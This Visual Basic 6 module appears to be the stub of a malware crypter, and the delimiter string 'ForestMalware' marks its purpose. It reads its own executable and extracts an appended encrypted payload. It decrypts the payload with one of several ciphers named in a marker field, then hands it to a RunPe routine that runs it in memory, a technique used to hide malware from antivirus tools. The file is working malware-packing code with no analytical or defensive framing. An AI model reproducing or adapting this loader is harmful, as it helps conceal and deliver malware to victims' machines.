Attribute VB_Name = "Module1"
Dim sDatas As String, sBreak() As String, strDatas() As Byte
Dim EnRC4 As New clsRC4
Dim EnBlowfish As New clsBlowfish
Dim EnTwofish As New clsTwofish
Dim EnSkipjack As New clsSkipjack
Dim EnTEA As New clsTEA
Dim EnDES As New clsDES
Dim EnXOR As New clsXOR
Dim EnGost As New clsGost
Dim EnRijndael As New clsRijndael
Dim EnSerpent As New clsSerpent


Sub Main()
Open App.Path & "\" & App.EXEName & ".exe" For Binary As 1
sDatas = Space(LOF(1))
Get 1, , sDatas
Close 1

sBreak = Split(sDatas, "ForestMalware")
If sBreak(2) = "EnRC4" Then
 sBreak(1) = EnRC4.DecryptString(sBreak(1), sBreak(3))
End If
If sBreak(2) = "EnBlowfish" Then
 sBreak(1) = EnBlowfish.DecryptString(sBreak(1), sBreak(3))
End If
If sBreak(2) = "EnTwofish" Then
 sBreak(1) = EnTwofish.DecryptString(sBreak(1), sBreak(3))
 End If
If sBreak(2) = "EnSkipjack" Then
 sBreak(1) = EnSkipjack.DecryptString(sBreak(1), sBreak(3))
End If
If sBreak(2) = "EnTEA" Then
 sBreak(1) = EnTEA.DecryptString(sBreak(1), sBreak(3))
End If
If sBreak(2) = "EnDES" Then
 sBreak(1) = EnDES.DecryptString(sBreak(1), sBreak(3))
End If
If sBreak(2) = "EnXOR" Then
 sBreak(1) = EnXOR.DecryptString(sBreak(1), sBreak(3))
End If
If sBreak(2) = "EnGost" Then
 sBreak(1) = EnGost.DecryptString(sBreak(1), sBreak(3))
End If
If sBreak(2) = "EnRijndael" Then
 sBreak(1) = EnRijndael.DecryptString(sBreak(1), sBreak(3))
 End If


strDatas() = StrConv(sBreak(1), vbFromUnicode)

Call RunPe(App.Path & "\" & App.EXEName & ".exe", strDatas(), Command)

End Sub

